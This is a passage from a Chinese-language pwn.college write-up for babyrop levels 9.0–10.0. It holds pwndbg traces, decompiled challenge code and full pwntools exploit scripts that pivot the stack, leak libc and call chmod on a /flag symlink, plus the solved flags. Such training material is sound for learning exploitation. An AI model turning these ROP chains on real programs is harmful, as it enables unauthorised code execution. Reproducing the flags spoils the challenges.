 RBX  0x7fff4c2cfdf8 —▸ 0x7fff4c2d0635 ◂— '/home/cub3y0nd/Projects/pwn.college/babyrop_level9.0'
 RCX  0x7d78a471b7a4 (write+20) ◂— cmp rax, -0x1000 /* 'H=' */
*RDX  0
*RDI  0x7d78a47f8710 ◂— 0
*RSI  0x7d78a47f7643 (_IO_2_1_stdout_+131) ◂— 0x7f8710000000000a /* '\n' */
*R8   0x20710
 R9   7
*R10  0x27643840 ◂— 0
 R11  0x202
 R12  1
 R13  0
 R14  0x7d78a4fd4000 (_rtld_global) —▸ 0x7d78a4fd52e0 ◂— 0
 R15  0
*RBP  0x7fff4c2cfcd0 —▸ 0x7fff4c2cfd70 —▸ 0x7fff4c2cfdd0 ◂— 0
*RSP  0x7fff4c2cfca8 —▸ 0x40129d (__do_global_dtors_aux+29) ◂— pop rbp
*RIP  0x4026b5 (challenge+482) ◂— ret
────────────────────────────────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]────────────────────────────────────────────────────────────────────
 ► 0x4026b5 <challenge+482>               ret                                <__do_global_dtors_aux+29>
    ↓
   0x40129d <__do_global_dtors_aux+29>    pop    rbp     RBP => 0x4050a0 (stdout@@GLIBC_2.2.5)
   0x40129e <__do_global_dtors_aux+30>    ret                                <print_gadget+498>
    ↓
   0x4016ab <print_gadget+498>            leave
   0x4016ac <print_gadget+499>            ret                                <0>
    ↓



─────────────────────────────────────────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────────────────────────────────────────
00:0000│ rsp 0x7fff4c2cfca8 —▸ 0x40129d (__do_global_dtors_aux+29) ◂— pop rbp
01:0008│-020 0x7fff4c2cfcb0 —▸ 0x4050a0 (stdout@@GLIBC_2.2.5) —▸ 0x7d78a47f75c0 (_IO_2_1_stdout_) ◂— 0xfbad2887
02:0010│-018 0x7fff4c2cfcb8 —▸ 0x4016ab (print_gadget+498) ◂— leave
03:0018│-010 0x7fff4c2cfcc0 —▸ 0x7fff4c2cfdf8 —▸ 0x7fff4c2d0635 ◂— '/home/cub3y0nd/Projects/pwn.college/babyrop_level9.0'
04:0020│-008 0x7fff4c2cfcc8 ◂— 0x14c2cfdf8
05:0028│ rbp 0x7fff4c2cfcd0 —▸ 0x7fff4c2cfd70 —▸ 0x7fff4c2cfdd0 ◂— 0
06:0030│+008 0x7fff4c2cfcd8 —▸ 0x7d78a4634e08 ◂— mov edi, eax
07:0038│+010 0x7fff4c2cfce0 —▸ 0x7fff4c2cfd20 —▸ 0x7d78a4fd4000 (_rtld_global) —▸ 0x7d78a4fd52e0 ◂— 0
───────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]────────────────────────────────────────────────────────────────────────────────
 ► 0         0x4026b5 challenge+482
   1         0x40129d __do_global_dtors_aux+29
   2         0x4050a0 stdout@@GLIBC_2.2.5
   3         0x4016ab print_gadget+498
   4   0x7d78a4634e08
   5   0x7d78a4634ecc __libc_start_main+140
   6         0x4011fe _start+46
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
pwndbg> ni
0x000000000040129d in __do_global_dtors_aux ()
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
───────────────────────────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]───────────────────────────────────────────────────────────
 RAX  9
 RBX  0x7fff4c2cfdf8 —▸ 0x7fff4c2d0635 ◂— '/home/cub3y0nd/Projects/pwn.college/babyrop_level9.0'
 RCX  0x7d78a471b7a4 (write+20) ◂— cmp rax, -0x1000 /* 'H=' */
 RDX  0
 RDI  0x7d78a47f8710 ◂— 0
 RSI  0x7d78a47f7643 (_IO_2_1_stdout_+131) ◂— 0x7f8710000000000a /* '\n' */
 R8   0x20710
 R9   7
 R10  0x27643840 ◂— 0
 R11  0x202
 R12  1
 R13  0
 R14  0x7d78a4fd4000 (_rtld_global) —▸ 0x7d78a4fd52e0 ◂— 0
 R15  0
 RBP  0x7fff4c2cfcd0 —▸ 0x7fff4c2cfd70 —▸ 0x7fff4c2cfdd0 ◂— 0
*RSP  0x7fff4c2cfcb0 —▸ 0x4050a0 (stdout@@GLIBC_2.2.5) —▸ 0x7d78a47f75c0 (_IO_2_1_stdout_) ◂— 0xfbad2887
*RIP  0x40129d (__do_global_dtors_aux+29) ◂— pop rbp
────────────────────────────────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]────────────────────────────────────────────────────────────────────
   0x4026b5 <challenge+482>               ret                                <__do_global_dtors_aux+29>
    ↓
 ► 0x40129d <__do_global_dtors_aux+29>    pop    rbp     RBP => 0x4050a0 (stdout@@GLIBC_2.2.5)
   0x40129e <__do_global_dtors_aux+30>    ret                                <print_gadget+498>
    ↓
   0x4016ab <print_gadget+498>            leave
   0x4016ac <print_gadget+499>            ret                                <0>
    ↓



─────────────────────────────────────────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────────────────────────────────────────
00:0000│ rsp 0x7fff4c2cfcb0 —▸ 0x4050a0 (stdout@@GLIBC_2.2.5) —▸ 0x7d78a47f75c0 (_IO_2_1_stdout_) ◂— 0xfbad2887
01:0008│-018 0x7fff4c2cfcb8 —▸ 0x4016ab (print_gadget+498) ◂— leave
02:0010│-010 0x7fff4c2cfcc0 —▸ 0x7fff4c2cfdf8 —▸ 0x7fff4c2d0635 ◂— '/home/cub3y0nd/Projects/pwn.college/babyrop_level9.0'
03:0018│-008 0x7fff4c2cfcc8 ◂— 0x14c2cfdf8
04:0020│ rbp 0x7fff4c2cfcd0 —▸ 0x7fff4c2cfd70 —▸ 0x7fff4c2cfdd0 ◂— 0
05:0028│+008 0x7fff4c2cfcd8 —▸ 0x7d78a4634e08 ◂— mov edi, eax
06:0030│+010 0x7fff4c2cfce0 —▸ 0x7fff4c2cfd20 —▸ 0x7d78a4fd4000 (_rtld_global) —▸ 0x7d78a4fd52e0 ◂— 0
07:0038│+018 0x7fff4c2cfce8 —▸ 0x7fff4c2cfdf8 —▸ 0x7fff4c2d0635 ◂— '/home/cub3y0nd/Projects/pwn.college/babyrop_level9.0'
───────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]────────────────────────────────────────────────────────────────────────────────
 ► 0         0x40129d __do_global_dtors_aux+29
   1         0x4050a0 stdout@@GLIBC_2.2.5
   2         0x4016ab print_gadget+498
   3   0x7d78a4634e08
   4   0x7d78a4634ecc __libc_start_main+140
   5         0x4011fe _start+46
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
pwndbg>
0x000000000040129e in __do_global_dtors_aux ()
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
───────────────────────────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]───────────────────────────────────────────────────────────
 RAX  9
 RBX  0x7fff4c2cfdf8 —▸ 0x7fff4c2d0635 ◂— '/home/cub3y0nd/Projects/pwn.college/babyrop_level9.0'
 RCX  0x7d78a471b7a4 (write+20) ◂— cmp rax, -0x1000 /* 'H=' */
 RDX  0
 RDI  0x7d78a47f8710 ◂— 0
 RSI  0x7d78a47f7643 (_IO_2_1_stdout_+131) ◂— 0x7f8710000000000a /* '\n' */
 R8   0x20710
 R9   7
 R10  0x27643840 ◂— 0
 R11  0x202
 R12  1
 R13  0
 R14  0x7d78a4fd4000 (_rtld_global) —▸ 0x7d78a4fd52e0 ◂— 0
 R15  0
*RBP  0x4050a0 (stdout@@GLIBC_2.2.5) —▸ 0x7d78a47f75c0 (_IO_2_1_stdout_) ◂— 0xfbad2887
*RSP  0x7fff4c2cfcb8 —▸ 0x4016ab (print_gadget+498) ◂— leave
*RIP  0x40129e (__do_global_dtors_aux+30) ◂— ret
────────────────────────────────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]────────────────────────────────────────────────────────────────────
   0x4026b5 <challenge+482>               ret                                <__do_global_dtors_aux+29>
    ↓
   0x40129d <__do_global_dtors_aux+29>    pop    rbp     RBP => 0x4050a0 (stdout@@GLIBC_2.2.5)
 ► 0x40129e <__do_global_dtors_aux+30>    ret                                <print_gadget+498>
    ↓
   0x4016ab <print_gadget+498>            leave
   0x4016ac <print_gadget+499>            ret                                <0>
    ↓



─────────────────────────────────────────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────────────────────────────────────────
00:0000│ rsp 0x7fff4c2cfcb8 —▸ 0x4016ab (print_gadget+498) ◂— leave
01:0008│     0x7fff4c2cfcc0 —▸ 0x7fff4c2cfdf8 —▸ 0x7fff4c2d0635 ◂— '/home/cub3y0nd/Projects/pwn.college/babyrop_level9.0'
02:0010│     0x7fff4c2cfcc8 ◂— 0x14c2cfdf8
03:0018│     0x7fff4c2cfcd0 —▸ 0x7fff4c2cfd70 —▸ 0x7fff4c2cfdd0 ◂— 0
04:0020│     0x7fff4c2cfcd8 —▸ 0x7d78a4634e08 ◂— mov edi, eax
05:0028│     0x7fff4c2cfce0 —▸ 0x7fff4c2cfd20 —▸ 0x7d78a4fd4000 (_rtld_global) —▸ 0x7d78a4fd52e0 ◂— 0
06:0030│     0x7fff4c2cfce8 —▸ 0x7fff4c2cfdf8 —▸ 0x7fff4c2d0635 ◂— '/home/cub3y0nd/Projects/pwn.college/babyrop_level9.0'
07:0038│     0x7fff4c2cfcf0 ◂— 0x100400040 /* '@' */
───────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]────────────────────────────────────────────────────────────────────────────────
 ► 0         0x40129e __do_global_dtors_aux+30
   1         0x4016ab print_gadget+498
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
pwndbg>
0x00000000004016ab in print_gadget ()
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
───────────────────────────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]───────────────────────────────────────────────────────────
 RAX  9
 RBX  0x7fff4c2cfdf8 —▸ 0x7fff4c2d0635 ◂— '/home/cub3y0nd/Projects/pwn.college/babyrop_level9.0'
 RCX  0x7d78a471b7a4 (write+20) ◂— cmp rax, -0x1000 /* 'H=' */
 RDX  0
 RDI  0x7d78a47f8710 ◂— 0
 RSI  0x7d78a47f7643 (_IO_2_1_stdout_+131) ◂— 0x7f8710000000000a /* '\n' */
 R8   0x20710
 R9   7
 R10  0x27643840 ◂— 0
 R11  0x202
 R12  1
 R13  0
 R14  0x7d78a4fd4000 (_rtld_global) —▸ 0x7d78a4fd52e0 ◂— 0
 R15  0
 RBP  0x4050a0 (stdout@@GLIBC_2.2.5) —▸ 0x7d78a47f75c0 (_IO_2_1_stdout_) ◂— 0xfbad2887
*RSP  0x7fff4c2cfcc0 —▸ 0x7fff4c2cfdf8 —▸ 0x7fff4c2d0635 ◂— '/home/cub3y0nd/Projects/pwn.college/babyrop_level9.0'
*RIP  0x4016ab (print_gadget+498) ◂— leave
────────────────────────────────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]────────────────────────────────────────────────────────────────────
   0x4026b5 <challenge+482>               ret                                <__do_global_dtors_aux+29>
    ↓
   0x40129d <__do_global_dtors_aux+29>    pop    rbp     RBP => 0x4050a0 (stdout@@GLIBC_2.2.5)
   0x40129e <__do_global_dtors_aux+30>    ret                                <print_gadget+498>
    ↓
 ► 0x4016ab <print_gadget+498>            leave
   0x4016ac <print_gadget+499>            ret                                <0>
    ↓



─────────────────────────────────────────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────────────────────────────────────────
00:0000│ rsp 0x7fff4c2cfcc0 —▸ 0x7fff4c2cfdf8 —▸ 0x7fff4c2d0635 ◂— '/home/cub3y0nd/Projects/pwn.college/babyrop_level9.0'
01:0008│     0x7fff4c2cfcc8 ◂— 0x14c2cfdf8
02:0010│     0x7fff4c2cfcd0 —▸ 0x7fff4c2cfd70 —▸ 0x7fff4c2cfdd0 ◂— 0
03:0018│     0x7fff4c2cfcd8 —▸ 0x7d78a4634e08 ◂— mov edi, eax
04:0020│     0x7fff4c2cfce0 —▸ 0x7fff4c2cfd20 —▸ 0x7d78a4fd4000 (_rtld_global) —▸ 0x7d78a4fd52e0 ◂— 0
05:0028│     0x7fff4c2cfce8 —▸ 0x7fff4c2cfdf8 —▸ 0x7fff4c2d0635 ◂— '/home/cub3y0nd/Projects/pwn.college/babyrop_level9.0'
06:0030│     0x7fff4c2cfcf0 ◂— 0x100400040 /* '@' */
07:0038│     0x7fff4c2cfcf8 —▸ 0x4026b6 (main) ◂— endbr64
───────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]────────────────────────────────────────────────────────────────────────────────
 ► 0         0x4016ab print_gadget+498
   1              0x0
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
pwndbg>
0x00000000004016ac in print_gadget ()
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
───────────────────────────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]───────────────────────────────────────────────────────────
 RAX  9
 RBX  0x7fff4c2cfdf8 —▸ 0x7fff4c2d0635 ◂— '/home/cub3y0nd/Projects/pwn.college/babyrop_level9.0'
 RCX  0x7d78a471b7a4 (write+20) ◂— cmp rax, -0x1000 /* 'H=' */
 RDX  0
 RDI  0x7d78a47f8710 ◂— 0
 RSI  0x7d78a47f7643 (_IO_2_1_stdout_+131) ◂— 0x7f8710000000000a /* '\n' */
 R8   0x20710
 R9   7
 R10  0x27643840 ◂— 0
 R11  0x202
 R12  1
 R13  0
 R14  0x7d78a4fd4000 (_rtld_global) —▸ 0x7d78a4fd52e0 ◂— 0
 R15  0
*RBP  0x7d78a47f75c0 (_IO_2_1_stdout_) ◂— 0xfbad2887
*RSP  0x4050a8 ◂— 0
*RIP  0x4016ac (print_gadget+499) ◂— ret
────────────────────────────────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]────────────────────────────────────────────────────────────────────
   0x4026b5 <challenge+482>               ret                                <__do_global_dtors_aux+29>
    ↓
   0x40129d <__do_global_dtors_aux+29>    pop    rbp     RBP => 0x4050a0 (stdout@@GLIBC_2.2.5)
   0x40129e <__do_global_dtors_aux+30>    ret                                <print_gadget+498>
    ↓
   0x4016ab <print_gadget+498>            leave
 ► 0x4016ac <print_gadget+499>            ret                                <0>
    ↓



─────────────────────────────────────────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────────────────────────────────────────
00:0000│ rsp 0x4050a8 ◂— 0
01:0008│     0x4050b0 (stdin@@GLIBC_2.2.5) —▸ 0x7d78a47f68e0 (_IO_2_1_stdin_) ◂— 0xfbad208b
02:0010│     0x4050b8 (completed) ◂— 0
... ↓        2 skipped
05:0028│     0x4050d0 (bp_) —▸ 0x7fff4c2cfca0 —▸ 0x7fff4c2cfcd0 —▸ 0x7fff4c2cfd70 —▸ 0x7fff4c2cfdd0 ◂— ...
06:0030│     0x4050d8 (cv_) ◂— 0
07:0038│     0x4050e0 (data) ◂— 0
───────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]────────────────────────────────────────────────────────────────────────────────
 ► 0         0x4016ac print_gadget+499
   1              0x0
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
pwndbg> dist $rsp $1
0x4050a8->0x4150e0 is 0x10038 bytes (0x2007 words)
pwndbg> x/10gx $1
0x4150e0 <data+65536>: 0x000000000040129d 0x00000000004050a0
0x4150f0 <data+65552>: 0x00000000004016ab 0x0000000000000000
0x415100 <data+65568>: 0x0000000000000000 0x0000000000000000
0x415110 <data+65584>: 0x0000000000000000 0x0000000000000000
0x415120 <data+65600>: 0x0000000000000000 0x0000000000000000
```

通过上面的调试我们知道，执行完栈迁移后应该返回到 `elf.bss() + 0x10038 + 0x18` 处继续执行，`+ 0x18` 是为了跳过执行栈迁移的三条指令。

那么接下来就好办了，思路可以参考 [Level 8](#level-80)。既然我们已经有了更大的栈空间存放 gadgets，那接下来就只要泄漏 `libc` 基地址，调用 `chmod` 就好了。

## Exploit

```python
#!/usr/bin/python3

from pwn import (
    ELF,
    ROP,
    context,
    flat,
    gdb,
    log,
    os,
    process,
    remote,
)

context(log_level="debug", terminal="kitty")

FILE = "./babyrop_level9.0"
HOST, PORT = "localhost", 1337

gdbscript = """
b *challenge+409
b *challenge+482
c
"""


def launch(local=True, debug=False, aslr=False, argv=None, envp=None):
    if local:
        global elf

        elf = ELF(FILE)
        context.binary = elf

        if debug:
            return gdb.debug(
                [elf.path] + (argv or []), gdbscript=gdbscript, aslr=aslr, env=envp
            )
        else:
            return process([elf.path] + (argv or []), env=envp)
    else:
        return remote(HOST, PORT)


def send_payload(target, payload):
    try:
        target.send(payload)
    except Exception as e:
        log.exception(f"An error occurred while sending payload: {e}")


def construct_payload(stage, leaked_addr=None):
    rop = ROP(elf)
    libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

    pop_rbp_ret = rop.rbp.address
    leavel_ret = rop.leave.address
    pop_rdi_ret = rop.rdi.address
    pop_rsi_pop_r15_ret = rop.find_gadget(["pop rsi", "pop r15", "ret"]).address

    gadgets_offset = 0x10038 + 0x18

    if stage == 1:
        payload = flat(
            pop_rbp_ret,
            elf.bss() + gadgets_offset,
            leavel_ret,
            pop_rdi_ret,
            elf.got["puts"],
            elf.plt["puts"],
            elf.symbols["_start"],
        )

        return payload
    elif stage == 2:
        libc.address = leaked_addr - libc.symbols["puts"]

        filename = next(elf.search(b"GNU"))
        mode = 0o4

        payload = flat(
            pop_rbp_ret,
            elf.bss() + gadgets_offset,
            leavel_ret,
            pop_rdi_ret,
            filename,
            pop_rsi_pop_r15_ret,
            mode,
            b"".ljust(0x8, b"A"),
            libc.symbols["chmod"],
        )

        return payload
    else:
        log.error("Incorrect stage number!")


def leak(target):
    target.recvuntil(b"Leaving!\x0a")

    return int.from_bytes(target.recv(0x6), "little")


def attack(target, payload):
    try:
        os.system("ln -s /flag GNU")

        send_payload(target, payload)

        payload = construct_payload(2, leak(target))

        send_payload(target, payload)

        target.recvall(timeout=3)

        try:
            with open("/flag", "r") as file:
                content = file.read()
                log.success(content)

                return True
        except FileNotFoundError:
            log.exception("The file '/flag' does not exist.")
        except PermissionError:
            log.failure("Permission denied to read '/flag'.")
        except Exception as e:
            log.exception(f"An error occurred while performing attack: {e}")
    except Exception as e:
        log.exception(f"An error occurred while performing attack: {e}")


def main():
    try:
        target = launch(debug=False)
        payload = construct_payload(1)

        if attack(target, payload):
            exit()
    except Exception as e:
        log.exception(f"An error occurred in main: {e}")


if __name__ == "__main__":
    main()
```

## Flag

Flag: `pwn.college{8pCSQF9tTLebDaqobUsXUt7T1Yp.01N1MDL5cTNxgzW}`

# Level 9.1

## Information

- Category: Pwn

## Description

> Perform a stack pivot to gain control flow!

## Write-up

参见 [Level 9.0](#level-90)。

## Exploit

```python
#!/usr/bin/python3

from pwn import (
    ELF,
    ROP,
    context,
    flat,
    gdb,
    log,
    os,
    process,
    remote,
)

context(log_level="debug", terminal="kitty")

FILE = "./babyrop_level9.1"
HOST, PORT = "localhost", 1337

gdbscript = """
b *challenge+78
b *challenge+97
c
"""


def launch(local=True, debug=False, aslr=False, argv=None, envp=None):
    if local:
        global elf

        elf = ELF(FILE)
        context.binary = elf

        if debug:
            return gdb.debug(
                [elf.path] + (argv or []), gdbscript=gdbscript, aslr=aslr, env=envp
            )
        else:
            return process([elf.path] + (argv or []), env=envp)
    else:
        return remote(HOST, PORT)


def send_payload(target, payload):
    try:
        target.send(payload)
    except Exception as e:
        log.exception(f"An error occurred while sending payload: {e}")


def construct_payload(stage, leaked_addr=None):
    rop = ROP(elf)
    libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

    pop_rbp_ret = rop.rbp.address
    leavel_ret = rop.leave.address
    pop_rdi_ret = rop.rdi.address
    pop_rsi_pop_r15_ret = rop.find_gadget(["pop rsi", "pop r15", "ret"]).address

    gadgets_offset = 0x10018 + 0x18

    if stage == 1:
        payload = flat(
            pop_rbp_ret,
            elf.bss() + gadgets_offset,
            leavel_ret,
            pop_rdi_ret,
            elf.got["puts"],
            elf.plt["puts"],
            elf.symbols["_start"],
        )

        return payload
    elif stage == 2:
        libc.address = leaked_addr - libc.symbols["puts"]

        filename = next(elf.search(b"GNU"))
        mode = 0o4

        payload = flat(
            pop_rbp_ret,
            elf.bss() + gadgets_offset,
            leavel_ret,
            pop_rdi_ret,
            filename,
            pop_rsi_pop_r15_ret,
            mode,
            b"".ljust(0x8, b"A"),
            libc.symbols["chmod"],
        )

        return payload
    else:
        log.error("Incorrect stage number!")


def leak(target):
    target.recvuntil(b"Leaving!\x0a")

    return int.from_bytes(target.recv(0x6), "little")


def attack(target, payload):
    try:
        os.system("ln -s /flag GNU")

        send_payload(target, payload)

        payload = construct_payload(2, leak(target))

        send_payload(target, payload)

        target.recvall(timeout=3)

        try:
            with open("/flag", "r") as file:
                content = file.read()
                log.success(content)

                return True
        except FileNotFoundError:
            log.exception("The file '/flag' does not exist.")
        except PermissionError:
            log.failure("Permission denied to read '/flag'.")
        except Exception as e:
            log.exception(f"An error occurred while performing attack: {e}")
    except Exception as e:
        log.exception(f"An error occurred while performing attack: {e}")


def main():
    try:
        target = launch(debug=False)
        payload = construct_payload(1)

        if attack(target, payload):
            exit()
    except Exception as e:
        log.exception(f"An error occurred in main: {e}")


if __name__ == "__main__":
    main()
```

## Flag

Flag: `pwn.college{8cUj1kJEP7UIyfDvbSd34M8nJI-.0FO1MDL5cTNxgzW}`

# Level 10.0

## Information

- Category: Pwn

## Description

> Perform a partial overwrite to call the win function.

## Write-up

```c ins={41-44} del={46} collapse={1-37, 50-52}
int __fastcall challenge(int a1, __int64 a2, __int64 a3)
{
  _QWORD v4[3]; // [rsp+0h] [rbp-A0h] BYREF
  int v5; // [rsp+1Ch] [rbp-84h]
  void *dest[15]; // [rsp+20h] [rbp-80h] BYREF
  int v7; // [rsp+9Ch] [rbp-4h]
  __int64 savedregs; // [rsp+A0h] [rbp+0h] BYREF
  _UNKNOWN *retaddr; // [rsp+A8h] [rbp+8h] BYREF

  v5 = a1;
  v4[2] = a2;
  v4[1] = a3;
  puts(
    "This challenge reads in some bytes, overflows its stack, and allows you to perform a ROP attack. Through this series of");
  puts("challenges, you will become painfully familiar with the concept of Return Oriented Programming!\n");
  memset(dest, 0, 0x70uLL);
  sp_ = (__int64)v4;
  bp_ = (__int64)&savedregs;
  sz_ = ((unsigned __int64)((char *)&savedregs - (char *)v4) >> 3) + 2;
  rp_ = (__int64)&retaddr;
  puts(
    "PIE is turned on! This means that you do not know where any of the gadgets in the main binary are. However, you can do a");
  puts(
    "partial overwrite of the saved instruction pointer in order to execute 1 gadget! If that saved instruction pointer goes");
  puts(
    "to libc, you will need to ROP from there. If that saved instruction pointer goes to the main binary, you will need to");
  puts(
    "ROP from there. You may need need to execute your payload several times to account for the randomness introduced. This");
  puts("might take anywhere from 0-12 bits of bruteforce depending on the scenario.\n");
  puts("In this challenge, a pointer to the win function is stored on the stack.");
  printf("That pointer is stored at %p, %d bytes before your input buffer.\n", dest, 8);
  puts("If you can pivot the stack to make the next gadget run be that win function, you will get the flag!\n");
  puts("ASLR means that the address of the stack is not known,");
  puts("but I will simulate a memory disclosure of it.");
  puts("By knowing where the stack is, you can now reference data");
  puts("that you write onto the stack.");
  puts("Be careful: this data could trip up your ROP chain,");
  puts("because it could be interpreted as return addresses.");
  puts("You can use gadgets that shift the stack appropriately to avoid that.");
  printf("[LEAK] Your input buffer is located at: %p.\n\n", &dest[1]);
  dest[0] = mmap(0LL, 0x138uLL, 3, 34, 0, 0LL);
  memcpy(dest[0], sub_2760, 0x138uLL);
  if ( mprotect(dest[0], 0x138uLL, 5) )
    __assert_fail("mprotect(data.win_addr, 0x138, PROT_READ|PROT_EXEC) == 0", "<stdin>", 0xA0u, "challenge");
  printf("The win function has just been dynamically constructed at %p.\n", dest[0]);
  v7 = read(0, &dest[1], 0x1000uLL);
  printf("Received %d bytes! This is potentially %d gadgets.\n", v7, ((unsigned __int64)&dest[1] + v7 - rp_) >> 3);
  puts("Let's take a look at your chain! Note that we have no way to verify that the gadgets are executable");
  puts("from within this challenge. You will have to do that by yourself.");
  print_chain(rp_, (unsigned int)(((unsigned __int64)&dest[1] + v7 - rp_) >> 3) + 1);
  return puts("Leaving!");
}
```

```c
signed __int64 sub_2760()
{
  signed __int64 v0; // rax
  char v2[264]; // [rsp+0h] [rbp-108h] BYREF

  *(_QWORD *)v2 = 0x67616C662FLL;
  v0 = sys_open(v2, 0, 0);
  return sys_write(1u, v2, sys_read(v0, v2, 0x100uLL));
}
```

标绿的部分把 `sub_2760` 的地址映射到了 `dest[0]`，并设置为 `r-x`，`read` 可以覆盖返回地址，但这个程序开启了 PIE，我们需要通过部分写绕过它，执行 `dest[0]` 处保存的 `sub_2760`。

比如我们知道一个 gadget 是 `0x0000000000001313 : pop rbp ; ret`，因为有 PIE 所以我们只能得到它的偏移 `0x313`，调试验证一下在已知页地址的情况下利用这个偏移得到的是否是 `pop rbp ; ret` 这个 gadget：

```asm wrap=false showLineNumbers=false collapse={2-20, 28-50}
Breakpoint 1, 0x000058bfb2ecdaf6 in challenge ()
------- tip of the day (disable with set show-tips off) -------
Pwndbg sets the SIGLARM, SIGBUS, SIGPIPE and SIGSEGV signals so they are not passed to the app; see info signals for full GDB signals configuration
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
───────────────────────────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]───────────────────────────────────────────────────────────
 RAX  9
 RBX  0x7ffe804c46d8 —▸ 0x7ffe804c6633 ◂— '/home/cub3y0nd/Projects/pwn.college/babyrop_level10.0'
 RCX  0x77b50a11b7a4 (write+20) ◂— cmp rax, -0x1000 /* 'H=' */
 RDX  0
 RDI  0x77b50a1f8710 ◂— 0
 RSI  0x77b50a1f7643 (_IO_2_1_stdout_+131) ◂— 0x1f8710000000000a /* '\n' */
 R8   0x58bfc6494010 ◂— 0
 R9   7
 R10  0x58bfc64942a0 ◂— 0x58bfc6494
 R11  0x202
 R12  1
 R13  0
 R14  0x77b50aae8000 (_rtld_global) —▸ 0x77b50aae92e0 —▸ 0x58bfb2ecc000 ◂— 0x10102464c457f
 R15  0
 RBP  0x4141414141414141 ('AAAAAAAA')
 RSP  0x7ffe804c4588 —▸ 0x58bfb2ecdb9c (main+165) ◂— lea rdi, [rip + 0xd98]
 RIP  0x58bfb2ecdaf6 (challenge+703) ◂— ret
────────────────────────────────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]────────────────────────────────────────────────────────────────────
 ► 0x58bfb2ecdaf6 <challenge+703>         ret                                <main+165>
    ↓
   0x58bfb2ecdb9c <main+165>              lea    rdi, [rip + 0xd98]     RDI => 0x58bfb2ece93b ◂— '### Goodbye!'
   0x58bfb2ecdba3 <main+172>              call   puts@plt                    <puts@plt>

   0x58bfb2ecdba8 <main+177>              mov    eax, 0                  EAX => 0
   0x58bfb2ecdbad <main+182>              leave
   0x58bfb2ecdbae <main+183>              ret

   0x58bfb2ecdbaf                         nop
   0x58bfb2ecdbb0 <__libc_csu_init>       endbr64
   0x58bfb2ecdbb4 <__libc_csu_init+4>     push   r15
   0x58bfb2ecdbb6 <__libc_csu_init+6>     lea    r15, [rip + 0x2173]     R15 => 0x58bfb2ecfd30 (__init_array_start) —▸ 0x58bfb2ecd320 (frame_dummy) ◂— endbr64
   0x58bfb2ecdbbd <__libc_csu_init+13>    push   r14
─────────────────────────────────────────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────────────────────────────────────────
00:0000│ rsp 0x7ffe804c4588 —▸ 0x58bfb2ecdb9c (main+165) ◂— lea rdi, [rip + 0xd98]
01:0008│     0x7ffe804c4590 ◂— 0
02:0010│     0x7ffe804c4598 —▸ 0x7ffe804c46e8 —▸ 0x7ffe804c6669 ◂— 'MOTD_SHOWN=pam'
03:0018│     0x7ffe804c45a0 —▸ 0x7ffe804c46d8 —▸ 0x7ffe804c6633 ◂— '/home/cub3y0nd/Projects/pwn.college/babyrop_level10.0'
04:0020│     0x7ffe804c45a8 ◂— 0x1804c46d8
05:0028│     0x7ffe804c45b0 —▸ 0x7ffe804c4650 —▸ 0x7ffe804c46b0 ◂— 0
06:0030│     0x7ffe804c45b8 —▸ 0x77b50a034e08 ◂— mov edi, eax
07:0038│     0x7ffe804c45c0 —▸ 0x7ffe804c4600 —▸ 0x77b50aae8000 (_rtld_global) —▸ 0x77b50aae92e0 —▸ 0x58bfb2ecc000 ◂— ...
───────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]────────────────────────────────────────────────────────────────────────────────
 ► 0   0x58bfb2ecdaf6 challenge+703
   1   0x58bfb2ecdb9c main+165
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
pwndbg> x/2i 0x58bfb2ecd313
   0x58bfb2ecd313 <__do_global_dtors_aux+51>: pop    rbp
   0x58bfb2ecd314 <__do_global_dtors_aux+52>: ret
```

嗯，看来猜想没问题，那么盲猜页地址加覆盖低三 nibbles 就可以调用我们的 gadgets 了。

知道了怎么调用 gadgets，还需要思考整体攻击思路。我们有一个已泄漏的栈地址，把这个地址减八就是保存 `sub_2760` 函数的地址的地址了，我们可以通过栈迁移把 `rsp` 设置为泄漏的地址减十六，这样 `ret` 就执行 `sub_2760` 了。

我本想这样做，勿喷……：

```python
payload = padding_to_ret
payload += flat(
    pop_rbp_ret_fixed_offset + random.choice(pop_rbp_ret_possible_bytes),
    pop_rbp_ret,
    leaked_addr,
    leave_ret_fixed_offset + random.choice(leave_ret_possible_bytes),
)
```

后来发现低 3 nibbles 覆盖了后 `pop_rbp_ret` 什么的会接着覆盖别的，所以这么做行不通。后来我意识到 `rbp` 在 `rip` 之前，提前设置好它不就完了？

需要注意的是 `leave ; ret` 到底要 `pop` 什么以及 `ret` 到哪里：

```asm wrap=false showLineNumbers=false
pwndbg> x/10gx 0x7ffd39e82968-0x10
